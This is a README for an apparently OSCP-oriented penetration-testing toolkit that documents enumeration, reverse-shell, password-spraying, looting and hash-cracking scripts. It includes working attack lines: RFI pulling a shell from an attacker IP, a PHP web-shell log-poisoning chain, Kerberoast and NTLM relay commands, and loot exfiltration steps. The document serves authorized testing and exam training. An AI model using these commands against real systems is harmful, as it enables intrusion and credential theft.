# Pen Testing Script Toolkit

> **⚠ LEGAL DISCLAIMER**
> These tools are for **authorized penetration testing and CTF use only**.
> Do not run them against systems you do not own or have **explicit written permission** to test.
> Unauthorized use may violate computer fraud laws in your jurisdiction.

---

## Table of Contents

1. [Requirements](#requirements)
2. [Script Quick Reference](#script-quick-reference)
3. [Enumeration Scripts](#enumeration-scripts)
   - [nmap\_searchsploit.sh](#nmap_searchsploitsh)
   - [snmp\_searchsploit.sh](#snmp_searchsploitsh)
   - [dir\_fuzz.sh](#dir_fuzzsh)
   - [lfi\_rfi\_tester.sh](#lfi_rfi_testersh)
   - [smb\_enum.sh](#smb_enumsh)
   - [ldap\_enum.sh](#ldap_enumsh)
   - [web\_enum.sh](#web_enumsh)
4. [Exploitation Scripts](#exploitation-scripts)
   - [rev\_shell\_gen.sh](#rev_shell_gensh)
   - [upload\_and\_exec.sh](#upload_and_execsh)
   - [password\_spray.sh](#password_spraysh)
5. [Post-Exploitation Scripts](#post-exploitation-scripts)
   - [linux\_privesc\_check.sh](#linux_privesc_checksh)
   - [loot.sh](#lootsh)
   - [hash\_crack.sh](#hash_cracksh)
   - [proof\_checker.sh](#proof_checkersh)
   - [port\_forward.sh](#port_forwardsh)
6. [Reporting Scripts](#reporting-scripts)
   - [screenshot\_notes.sh](#screenshot_notessh)
7. [Typical OSCP Workflow](#typical-oscp-workflow)
8. [Tips](#tips)

---

## Requirements

```bash
# Core tools
sudo apt install nmap ffuf jq curl hashcat sshpass

# Wordlists
sudo apt install seclists dirb

# Exploit database
sudo apt install exploitdb

# SMB enumeration
sudo apt install enum4linux smbclient smbmap crackmapexec

# LDAP / AD enumeration
sudo apt install ldap-utils

# Web fingerprinting
sudo apt install whatweb nikto
```

Make all scripts executable:

```bash
chmod +x *.sh
```

---

## Script Quick Reference

| Script | Purpose |
|---|---|
| `nmap_searchsploit.sh` | Parse nmap -sC -sV output and find exploits via searchsploit |
| `snmp_searchsploit.sh` | Parse SNMP scan output and find exploits via searchsploit |
| `dir_fuzz.sh` | Web directory and file fuzzing using ffuf and multiple wordlists |
| `lfi_rfi_tester.sh` | Test URL parameters for LFI and RFI vulnerabilities |
| `smb_enum.sh` | SMB share, user, group, signing, and vulnerability enumeration |
| `ldap_enum.sh` | LDAP/AD user, group, policy, Kerberoast, and AS-REP roast enumeration |
| `web_enum.sh` | Web fingerprinting — headers, whatweb, nikto, CMS detection, common paths |
| `rev_shell_gen.sh` | Generate reverse shell one-liners for Linux, Windows, and web targets |
| `upload_and_exec.sh` | Serve a file via HTTP and generate download one-liners for the target |
| `password_spray.sh` | Lockout-aware credential spraying over SMB, Kerberos, or LDAP |
| `linux_privesc_check.sh` | Linux privilege escalation enumeration (sudo, SUID, cron, capabilities, etc.) |
| `loot.sh` | Collect proof files, hashes, SSH keys, history, and configs from a shell |
| `hash_crack.sh` | Auto-detect hash type and crack with hashcat |
| `proof_checker.sh` | SSH to owned machines and collect proof files for exam reporting |
| `port_forward.sh` | Generate port forwarding and pivoting syntax for SSH, chisel, socat, etc. |
| `screenshot_notes.sh` | Create per-target exam folder structure with notes and command templates |

---

## Enumeration Scripts

---

### nmap_searchsploit.sh

Parses a saved `nmap -sC -sV` output file, extracts every open port's service
and version string, then queries searchsploit for known exploits. If no exact
match is found it prints a suggested broader two-word search.

#### Usage

```bash
./nmap_searchsploit.sh <nmap_output_file.txt>
```

#### Examples

```bash
# Scan and search in one step
nmap -sC -sV 10.10.10.5 -oN scan.txt && ./nmap_searchsploit.sh scan.txt

# All ports then search
nmap -sC -sV -p- 10.10.10.5 -oN full_scan.txt
./nmap_searchsploit.sh full_scan.txt

# Save output
./nmap_searchsploit.sh scan.txt | tee hits.txt
```

> Expects normal format (`-oN`). Does not support grepable or XML output.

---

### snmp_searchsploit.sh

Parses nmap SNMP script output, extracts product/version strings from sysDescr,
snmp-win32-software, and version banners, then queries searchsploit.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-f <file>` | nmap output file (use `-` for stdin) | — |
| `-t <target>` | Run a live nmap SNMP scan then search | — |
| `-c <community>` | SNMP community string | `public` |
| `-o <file>` | Save results to file | — |
| `-j` | Write JSON summary | off |
| `-v` | Verbose | off |

#### Examples

```bash
# Live scan
./snmp_searchsploit.sh -t 10.10.10.5

# Parse saved file
./snmp_searchsploit.sh -f scan.nmap -o results.txt -j

# Non-default community string
./snmp_searchsploit.sh -t 192.168.1.0/24 -c private

# Pipe nmap directly
nmap -sU -p 161 --script snmp-info 10.10.10.5 | ./snmp_searchsploit.sh -f -
```

---

### dir_fuzz.sh

Runs multiple ffuf scans using SecLists and dirbuster wordlists. Results are
saved as JSON and summarised with colour-coded status codes at the end.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <target>` | Target IP or hostname | — |
| `-p <port>` | Port | `80` |
| `-s` | Use HTTPS | off |
| `-m <mode>` | `dirs`, `files`, or `both` | `both` |
| `-e <exts>` | Extensions for file scan | `.php,.asp,.aspx,.jsp,.html,.txt,.json` |
| `-c <cookie>` | Cookie string | — |
| `-T <threads>` | Threads | `50` |
| `-o <dir>` | Output directory | auto |
| `-r <depth>` | Recursion depth | `1` |
| `-f <codes>` | Filter status codes | — |
| `-z <size>` | Filter response size | — |

#### Examples

```bash
./dir_fuzz.sh -t 10.10.10.5
./dir_fuzz.sh -t 10.10.10.5 -p 8080
./dir_fuzz.sh -t 10.10.10.5 -s -p 443
./dir_fuzz.sh -t 10.10.10.5 -m dirs -f 404 -o ./results
./dir_fuzz.sh -t 10.10.10.5 -m files -e ".php,.bak,.old,.zip"
./dir_fuzz.sh -t 10.10.10.5 -c "PHPSESSID=abc123" -r 2 -T 100

# Parse results manually
cat ./ffuf_*/dirs-*.json | jq -r '.results[] | [.status,.url] | @tsv' | sort -u
awk '$1 == 200' ./ffuf_*/all_results.tsv
```

---

### lfi_rfi_tester.sh

Tests a URL parameter for LFI and RFI using the Jhaddix wordlist (~920 payloads).
Auto-downloads the wordlist if SecLists is not installed.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-u <url>` | Target URL with `FUZZ` placeholder | — |
| `-p <param>` | Parameter name to inject | — |
| `-t <type>` | `lfi`, `rfi`, or `both` | `both` |
| `-w <path>` | Custom wordlist | auto |
| `-r <url>` | Remote URL for RFI | — |
| `-c <cookie>` | Cookie string | — |
| `-o <file>` | Save confirmed hits | — |
| `-d <secs>` | Request delay | `0` |
| `-x` | Stop on first hit | off |

#### Examples

```bash
./lfi_rfi_tester.sh -u "http://10.10.10.5/page.php?file=FUZZ"
./lfi_rfi_tester.sh -u "http://10.10.10.5/index.php" -p page -t lfi -x
./lfi_rfi_tester.sh -u "http://10.10.10.5/page.php?f=FUZZ" -c "PHPSESSID=abc"
./lfi_rfi_tester.sh -u "http://10.10.10.5/load.php?f=FUZZ" -t rfi -r http://10.10.14.5/shell.txt
```

---

### smb_enum.sh

Runs a full SMB enumeration pass combining nmap NSE scripts, crackmapexec,
enum4linux, smbclient, and smbmap. Flags SMB signing disabled, writable shares,
EternalBlue, and extracts a clean user list for spraying.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <ip>` | Target IP (required) | — |
| `-u <user>` | Username | empty (null session) |
| `-p <pass>` | Password | empty |
| `-d <domain>` | Domain or workgroup | `WORKGROUP` |
| `-o <dir>` | Output directory | auto |

#### Examples

```bash
# Null session (unauthenticated)
./smb_enum.sh -t 10.10.10.5

# Guest account
./smb_enum.sh -t 10.10.10.5 -u guest -p ""

# Authenticated
./smb_enum.sh -t 10.10.10.5 -u administrator -p Password123 -d CORP

# Save output
./smb_enum.sh -t 10.10.10.5 -o ./smb_results
```

#### What it runs

| Tool | What it checks |
|---|---|
| nmap NSE | smb-security-mode, smb-vuln-ms17-010, smb-vuln-ms08-067, smb-enum-shares, smb-enum-users, smb-os-discovery |
| crackmapexec | Host info, shares, users, groups, password policy, logged-on users |
| enum4linux | Full enumeration — users, groups, shares, password policy, OS info |
| smbclient | Share listing + browsing common shares (Users, Backup, wwwroot, etc.) |
| smbmap | Share permissions — flags READ/WRITE access |

#### Output files

| File | Contents |
|---|---|
| `nmap_smb.txt` | NSE scan results |
| `cme_shares.txt` | Share list and permissions |
| `cme_users.txt` | User list |
| `cme_passpol.txt` | Password policy (check before spraying) |
| `enum4linux.txt` | Full enum4linux output |
| `users.txt` | Clean extracted user list for spraying |
| `share_contents.txt` | Directory listings of accessible shares |
| `smbmap.txt` | Share read/write permissions |

---

### ldap_enum.sh

Queries a domain controller via LDAP to enumerate users, groups, password
policy, Kerberoastable accounts (SPN set), and AS-REP roastable accounts
(no pre-auth). Extracts a clean username list and flags high-value targets.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <ip>` | Target DC IP (required) | — |
| `-d <domain>` | Domain e.g. `domain.local` (required) | — |
| `-u <user>` | Username (omit for anonymous bind) | — |
| `-p <pass>` | Password | — |
| `-o <dir>` | Output directory | auto |

#### Examples

```bash
# Anonymous / null bind
./ldap_enum.sh -t 10.10.10.5 -d domain.local

# Authenticated
./ldap_enum.sh -t 10.10.10.5 -d domain.local -u ldapuser -p Password123

# Save output
./ldap_enum.sh -t 10.10.10.5 -d domain.local -u user -p pass -o ./ldap_results
```

#### What it enumerates

| Query | Purpose |
|---|---|
| Anonymous bind test | Checks if credentials are needed at all |
| All users | sAMAccountName, description, memberOf, last logon, UAC flags |
| User descriptions | Often contain plaintext passwords left by admins |
| Password policy | Lockout threshold — critical before spraying |
| Privileged groups | Domain Admins, Enterprise Admins, Backup Operators, etc. |
| Kerberoastable accounts | SPN set + not a computer account |
| AS-REP roastable accounts | DONT_REQUIRE_PREAUTH flag set |
| Domain computers | OS versions, last logon |

#### Output files

| File | Contents |
|---|---|
| `usernames.txt` | Clean user list for password spraying |
| `user_descriptions.txt` | Descriptions — check for embedded passwords |
| `privileged_groups.txt` | Members of high-value groups |
| `kerberoastable.txt` | Accounts to target with GetUserSPNs.py |
| `asrep_roastable.txt` | Accounts to target with GetNPUsers.py |
| `computer_list.txt` | Domain computers and OS versions |

#### Follow-up commands

```bash
# Kerberoast with impacket
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.5 -request -outputfile tgs.txt
./hash_crack.sh -f tgs.txt -r best64

# AS-REP roast
GetNPUsers.py domain.local/ -usersfile ldap_results/usernames.txt -dc-ip 10.10.10.5 -no-pass
./hash_crack.sh -f asrep_hashes.txt

# Password spray with extracted users
./password_spray.sh -t 10.10.10.5 -d domain.local -u ldap_results/usernames.txt -p "Password123"
```

---

### web_enum.sh

Web technology fingerprinting combining HTTP header analysis, whatweb,
nikto, robots.txt retrieval, common path probing, and CMS detection.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <ip>` | Target IP or hostname | — |
| `-p <port>` | Port | `80` |
| `-s` | Use HTTPS | off |
| `-u <url>` | Full URL (overrides -t/-p/-s) | — |
| `-c <cookie>` | Cookie string | — |
| `-o <dir>` | Output directory | auto |

#### Examples

```bash
./web_enum.sh -t 10.10.10.5
./web_enum.sh -t 10.10.10.5 -p 8080
./web_enum.sh -t 10.10.10.5 -s -p 443
./web_enum.sh -u "http://10.10.10.5:8080/app"
./web_enum.sh -t 10.10.10.5 -c "PHPSESSID=abc123" -o ./web_results
```

#### What it checks

| Check | Details |
|---|---|
| Response headers | Server banner, X-Powered-By, HSTS, X-Frame-Options, CSP |
| whatweb | Technology stack fingerprinting with version strings |
| robots.txt / sitemap | Hidden paths, disallowed directories |
| Common paths | admin, wp-admin, phpmyadmin, .git/HEAD, .env, phpinfo.php, api docs, etc. |
| nikto | Automated vulnerability scan |
| CMS detection | WordPress (+ version), Joomla, Drupal, Magento — with follow-up tool suggestions |

#### Output files

| File | Contents |
|---|---|
| `headers.txt` | Raw HTTP response headers |
| `whatweb.txt` | Technology fingerprint output |
| `robots.txt` | robots.txt content if found |
| `common_paths.txt` | Status codes for all probed paths |
| `nikto.txt` | Full nikto scan results |

#### CMS follow-up commands

```bash
# WordPress
wpscan --url http://10.10.10.5 --enumerate u,p,t

# Joomla
joomscan -u http://10.10.10.5

# Drupal
droopescan scan drupal -u http://10.10.10.5
```

---

## Exploitation Scripts

---

### rev_shell_gen.sh

Generates ready-to-paste reverse shell one-liners for a given IP and port.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-i <ip>` | Your listener IP (required) | — |
| `-p <port>` | Listener port | `4444` |
| `-t <target>` | `linux`, `windows`, `web`, or `all` | `all` |

#### Examples

```bash
./rev_shell_gen.sh -i 10.10.14.5 -p 4444
./rev_shell_gen.sh -i 10.10.14.5 -p 9001 -t linux
./rev_shell_gen.sh -i 10.10.14.5 -p 4444 -t windows
./rev_shell_gen.sh -i 10.10.14.5 -p 4444 -t web
```

#### Shell types generated

| Target | Types |
|---|---|
| Linux | bash tcp, sh, netcat (with and without `-e`), python3, python2, perl, ruby, awk, lua, socat |
| Windows | PowerShell encoded, PowerShell plain, IEX download cradle, `nc.exe`, mshta, certutil, python |
| Web | PHP one-liner, PHP webshell, JSP, WAR (msfvenom), ASPX (msfvenom), Node.js |
| Bonus | msfvenom ELF/EXE/DLL stageless shells + post-catch shell upgrade commands |

---

### upload_and_exec.sh

Spins up a Python HTTP server to serve a file and prints every download
one-liner for the target. Auto-detects your tun0 VPN IP.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-f <file>` | File to serve (required) | — |
| `-i <ip>` | Attack box IP | auto tun0/eth0 |
| `-p <port>` | HTTP port | `8000` |
| `-n` | Just print one-liners, no server | off |

#### Examples

```bash
./upload_and_exec.sh -f /opt/linpeas.sh
./upload_and_exec.sh -f winpeas.exe -p 9001
./upload_and_exec.sh -f shell.php -n
```

#### Generated one-liners

| OS | Commands generated |
|---|---|
| Linux | `wget`, `curl`, `curl \| bash`, `python3` |
| Windows | PowerShell IEX, `Invoke-WebRequest`, `WebClient.DownloadFile`, `certutil`, `bitsadmin`, `curl.exe` |

---

### password_spray.sh

Lockout-aware credential spraying over SMB, Kerberos, or LDAP. Prompts for
confirmation before spraying and enforces a configurable delay between rounds.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <ip>` | Target IP (required) | — |
| `-d <domain>` | Domain name | — |
| `-u <file>` | User list file (required) | — |
| `-p <password>` | Single password to spray | — |
| `-P <file>` | Password list — one round per line | — |
| `-r <proto>` | Protocol: `smb`, `kerberos`, `ldap` | `smb` |
| `-D <secs>` | Delay between rounds | `30` |
| `-T <count>` | Stop after N hits | `0` (no limit) |
| `-o <dir>` | Output directory | auto |

#### Examples

```bash
# Single password over SMB
./password_spray.sh -t 10.10.10.5 -d corp.local -u users.txt -p "Password123"

# Multiple passwords with 60s delay between rounds
./password_spray.sh -t 10.10.10.5 -d corp.local -u users.txt -P passwords.txt -D 60

# Kerberos spray (fewer log events for valid users)
./password_spray.sh -t 10.10.10.5 -d corp.local -u users.txt -p "Spring2024!" -r kerberos

# Stop after first hit
./password_spray.sh -t 10.10.10.5 -d corp.local -u users.txt -p "Password123" -T 1
```

> **⚠ Always check the domain password policy before spraying.**
> Use `crackmapexec smb <target> --pass-pol -u '' -p ''` or check
> `ldap_enum.sh` output. Locking accounts costs points on the OSCP exam.

#### Valid credentials output

Confirmed credentials are written to `<outdir>/valid_credentials.txt`.

#### Follow-up with valid credentials

```bash
psexec.py domain/user:pass@10.10.10.5
evil-winrm -i 10.10.10.5 -u user -p pass
secretsdump.py domain/user:pass@10.10.10.5
crackmapexec smb 10.10.10.5 -u user -p pass -x "whoami"
```

---

## Post-Exploitation Scripts

---

### linux_privesc_check.sh

Comprehensive Linux privilege escalation enumeration. Run on the target
after gaining initial access.

#### Options

| Flag | Description |
|---|---|
| `-o <file>` | Save output to file |
| `-l` | Also download and run linpeas.sh |

#### Examples

```bash
./linux_privesc_check.sh
./linux_privesc_check.sh -o /tmp/privesc.txt
./linux_privesc_check.sh -l -o /tmp/full_report.txt
```

#### Checks performed

| Category | What it looks for |
|---|---|
| System info | Kernel version, OS, architecture |
| Users | UID 0 accounts, writable `/etc/passwd`, readable `/etc/shadow` |
| Sudo | `sudo -l` output + GTFOBins flags for vim, find, python, awk, nmap, etc. |
| SUID / SGID | All non-standard binaries flagged |
| Capabilities | `getcap -r /` — anything set is flagged |
| Cron | System and user crontabs, writable cron scripts |
| Writable paths | World-writable dirs, root-owned writable files, writable `$PATH` dirs |
| Interesting files | SSH keys, configs containing passwords, bash history |
| Processes | Root processes, internally listening ports |
| NFS | `/etc/exports` — flags `no_root_squash` |
| Container | Docker group, LXD group, `/.dockerenv` |

---

### loot.sh

Post-exploitation loot grabber. Collects proof files, hashes, SSH keys,
shell history, network info, and config files into a structured directory.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-o <dir>` | Output directory | `./loot_<hostname>_<timestamp>` |

#### Examples

```bash
# Run on target
./loot.sh
./loot.sh -o /tmp/loot

# Exfil back to attack box
tar czf loot.tar.gz ./loot_*/
base64 loot.tar.gz           # paste over restricted shell
python3 -m http.server 8888  # or serve and wget from attack box
```

#### What it collects

| Directory | Contents |
|---|---|
| `proofs/` | `root.txt`, `proof.txt`, `user.txt`, `local.txt`, identity context |
| `creds/` | `/etc/shadow` hashes, DB configs, files containing password strings |
| `keys/` | `id_rsa`, `id_ed25519`, `authorized_keys`, `.pem` files |
| `users/` | Bash/zsh history, installed package list |
| `network/` | Interfaces, routes, listening ports, `/etc/hosts`, ARP cache |
| `configs/` | nginx, Apache, sshd_config, crontab |

---

### hash_crack.sh

Auto-detects hash type from a file or single hash and runs hashcat with the
correct mode.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-f <file>` | File of hashes (one per line) | — |
| `-h <hash>` | Single hash string | — |
| `-w <wordlist>` | Wordlist | `rockyou.txt` |
| `-r <rules>` | Hashcat rules (e.g. `best64`, `dive`) | — |
| `-o <file>` | Save cracked hashes | — |
| `-x <args>` | Extra hashcat args | — |

#### Supported hash types (auto-detected)

| Mode | Type | Source |
|---|---|---|
| 1000 | NTLM | SAM dump, secretsdump |
| 5600 | NetNTLMv2 | Responder capture |
| 5500 | NetNTLMv1 | Responder capture |
| 13100 | Kerberos TGS | Kerberoasting |
| 18200 | Kerberos AS-REP | AS-REP roasting |
| 3200 | bcrypt | Web app databases |
| 1800 | sha512crypt | `/etc/shadow` |
| 500 | md5crypt | `/etc/shadow` older |
| 1400 | SHA-256 | Web app databases |
| 0 | MD5 | Web app databases |

#### Examples

```bash
./hash_crack.sh -f hashes.txt
./hash_crack.sh -h "5f4dcc3b5aa765d61d8327deb882cf99"
./hash_crack.sh -f hashes.txt -r best64
./hash_crack.sh -f ntlm.txt -o cracked.txt -r dive
./hash_crack.sh -f hashes.txt -x "--force --status"

# Show cracked hashes after the fact
hashcat -m 1000 hashes.txt --show
```

#### Common cracking chains

```bash
# Shadow hashes from loot.sh
./hash_crack.sh -f loot/creds/shadow_hashes.txt -r best64

# Responder NetNTLMv2
./hash_crack.sh -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Kerberoast TGS
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.5 -request -outputfile tgs.txt
./hash_crack.sh -f tgs.txt -r best64

# AS-REP roast
GetNPUsers.py domain.local/ -usersfile usernames.txt -dc-ip 10.10.10.5 -no-pass -outputfile asrep.txt
./hash_crack.sh -f asrep.txt
```

---

### proof_checker.sh

SSHes into owned machines, finds proof and flag files, captures identity
context, and saves everything ready for your exam report.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <ip>` | Single target IP | — |
| `-l <file>` | File with one IP per line | — |
| `-u <user>` | SSH username (required) | — |
| `-p <pass>` | SSH password (requires `sshpass`) | — |
| `-k <keyfile>` | SSH private key | — |
| `-P <port>` | SSH port | `22` |
| `-o <dir>` | Output directory | auto |

#### Examples

```bash
./proof_checker.sh -t 10.10.10.5 -u root -k ~/.ssh/id_rsa
./proof_checker.sh -t 10.10.10.5 -u root -p toor
./proof_checker.sh -l owned.txt -u administrator -p Password123 -o ./exam_proofs
```

#### Output structure

```
proof_20250101_120000/
├── summary.txt              ← all IPs and proof hashes in one place
└── 10.10.10.5/
    ├── proof_context.txt    ← whoami, id, hostname, IP
    ├── screenshot_block.txt ← formatted block ready to paste into report
    └── proof.txt            ← flag content
```

---

### port_forward.sh

Generates correct port forwarding and pivoting syntax for a given scenario.
Covers SSH, chisel, socat, plink, sshuttle, netsh, and ligolo-ng.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <type>` | `ssh`, `chisel`, `socat`, `plink`, `sshuttle`, or `all` | `all` |
| `-lh <ip>` | Local/attack box IP | auto tun0 |
| `-lp <port>` | Local port to listen on | — |
| `-rh <ip>` | Remote/target host IP | — |
| `-rp <port>` | Remote port to forward | — |
| `-j <host>` | Jump host IP | — |
| `-u <user>` | SSH username for jump host | — |

#### Examples

```bash
# Generate all syntax for a given scenario
./port_forward.sh -lp 8080 -rh 172.16.1.5 -rp 80

# SSH only
./port_forward.sh -t ssh -lp 8080 -rh 10.10.10.5 -rp 80 -j jumphost -u user

# Chisel SOCKS proxy
./port_forward.sh -t chisel -lp 1080 -lh 10.10.14.5

# All types — no args for quick reference
./port_forward.sh
```

#### Scenarios covered

| Type | Scenario |
|---|---|
| SSH local | Access remote port locally |
| SSH remote | Expose local port on remote box |
| SSH dynamic | SOCKS5 proxy through jump host |
| SSH double hop | Tunnel through two hosts |
| Chisel reverse | Reverse port forward from target |
| Chisel SOCKS | Full internal network access |
| Socat | TCP relay on a pivot host |
| Plink | Windows SSH client port forward |
| Sshuttle | Transparent VPN-like proxy |
| Netsh | Windows port proxy (as admin) |
| Ligolo-ng | Modern agent-based pivot tunnel |

---

## Reporting Scripts

---

### screenshot_notes.sh

Creates a structured folder layout per target with a pre-filled markdown
notes template and a target-specific command cheatsheet. Generates a master
index file tracking all targets, statuses, and proof hashes.

#### Options

| Flag | Description | Default |
|---|---|---|
| `-t <ip>` | Single target IP | — |
| `-l <file>` | File with one IP per line (supports `IP name` format) | — |
| `-n <name>` | Machine name label | — |
| `-o <dir>` | Base output directory | `./exam_<date>` |

#### Examples

```bash
# Single target
./screenshot_notes.sh -t 10.10.10.5

# With machine name label
./screenshot_notes.sh -t 10.10.10.5 -n "Legacy" -o ./oscp_exam

# Multiple targets from file
./screenshot_notes.sh -l targets.txt -o ./exam

# Targets file supports IP + name
echo "10.10.10.5 Legacy" > targets.txt
echo "10.10.10.6 Lame"   >> targets.txt
./screenshot_notes.sh -l targets.txt
```

#### Output structure per target

```
exam/
├── README.md                  ← master index with all targets and proof hashes
└── 10.10.10.5_Legacy/
    ├── notes.md               ← structured notes template
    ├── commands.sh            ← target-specific command cheatsheet
    ├── screenshots/           ← drop proof .png files here
    ├── scans/                 ← nmap, ffuf output
    ├── exploits/              ← exploit files
    ├── loot/                  ← credentials, hashes, keys
    └── proof/                 ← proof.txt, root.txt copies
```

#### notes.md template includes

- Open ports table
- Enumeration notes (web, SMB, other services)
- Exploitation steps and proof of execution
- Privilege escalation vector and steps
- Proof hash table with screenshot checklist
- Loot table for credentials, hashes, SSH keys, internal IPs

#### commands.sh template includes

Pre-built commands for the specific target IP covering nmap, web enum,
SMB enum, reverse shells, file transfer, post-exploitation, and proof collection.

---

## Typical OSCP Workflow

```bash
TARGET="10.10.10.5"
LHOST="10.10.14.5"

# ── SETUP ─────────────────────────────────────────────────────────────────────

# Create exam folder structure
./screenshot_notes.sh -t $TARGET -n "MachineName" -o ./exam

# ── ENUMERATION ───────────────────────────────────────────────────────────────

# Full TCP scan + exploit lookup
nmap -sC -sV -oN exam/${TARGET}*/scans/nmap.txt $TARGET
./nmap_searchsploit.sh exam/${TARGET}*/scans/nmap.txt

# UDP + SNMP
nmap -sU --top-ports 20 $TARGET
./snmp_searchsploit.sh -t $TARGET -o snmp.txt

# SMB
./smb_enum.sh -t $TARGET -o ./smb_$TARGET

# LDAP / AD (if domain-joined)
./ldap_enum.sh -t $TARGET -d domain.local -o ./ldap_$TARGET

# Web
./web_enum.sh -t $TARGET
./dir_fuzz.sh -t $TARGET -f 404
./lfi_rfi_tester.sh -u "http://$TARGET/page.php?file=FUZZ" -x

# ── EXPLOITATION ──────────────────────────────────────────────────────────────

# Generate shells
./rev_shell_gen.sh -i $LHOST -p 4444

# Start listener
nc -lvnp 4444

# Serve tools
./upload_and_exec.sh -f /opt/linpeas.sh

# Password spray (after getting a user list)
./password_spray.sh -t $TARGET -d domain.local -u smb_$TARGET/users.txt -p "Password123"

# ── POST-EXPLOITATION ─────────────────────────────────────────────────────────

# (Run the following on the target shell)
# ./linux_privesc_check.sh -o /tmp/privesc.txt
# ./loot.sh -o /tmp/loot

# Crack hashes
./hash_crack.sh -f loot/creds/shadow_hashes.txt -r best64

# Pivot to internal network
./port_forward.sh -t chisel -lp 1080 -lh $LHOST

# ── PROOF ─────────────────────────────────────────────────────────────────────

./proof_checker.sh -t $TARGET -u root -k ~/.ssh/id_rsa -o ./exam/proofs
```

**Responder + relay chain:**
```bash
# Capture hashes
sudo responder -I tun0 -wrf
./hash_crack.sh -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Or relay instead of cracking (if SMB signing disabled — flagged by smb_enum.sh)
ntlmrelayx.py -tf targets.txt -smb2support
```

**Kerberos attack chain:**
```bash
# Get user list
./ldap_enum.sh -t $TARGET -d domain.local

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip $TARGET -request -outputfile tgs.txt
./hash_crack.sh -f tgs.txt -r best64

# AS-REP roast
GetNPUsers.py domain.local/ -usersfile ldap_results/usernames.txt -dc-ip $TARGET -no-pass
./hash_crack.sh -f asrep.txt
```

**LFI to RCE chain:**
```bash
./lfi_rfi_tester.sh -u "http://$TARGET/page.php?f=FUZZ" -t lfi
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://$TARGET/"
curl "http://$TARGET/page.php?f=/var/log/apache2/access.log&cmd=id"
```

---

## Tips

- **Shell upgrade** — `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo` → `fg` → `export TERM=xterm`
- **tun0 IP** — `rev_shell_gen.sh`, `upload_and_exec.sh`, and `port_forward.sh` all auto-detect your VPN IP from `tun0`
- **Check lockout policy first** — always run `smb_enum.sh` or `ldap_enum.sh` to get the password policy before using `password_spray.sh`
- **Hash ambiguity** — 32-char hex is assumed NTLM by `hash_crack.sh`; if it's actually MD5 run `hashcat -m 0` manually
- **sshpass required** — `proof_checker.sh` needs `sshpass` for password-based SSH auth: `sudo apt install sshpass`
- **loot.sh exfil** — `tar czf loot.tar.gz ./loot_*/ && base64 loot.tar.gz` to copy over a restricted shell
- **SecLists missing** — `lfi_rfi_tester` auto-downloads `LFI-Jhaddix.txt` from GitHub; `dir_fuzz` skips missing wordlists with a warning
- **smb_enum signing flag** — if SMB signing is flagged as disabled, pivot to `ntlmrelayx.py` instead of cracking
- **ldap_enum descriptions** — always check `user_descriptions.txt`; admins frequently leave passwords there
- **screenshot_notes workflow** — run this first on each new target so your folder structure and notes are ready before you start
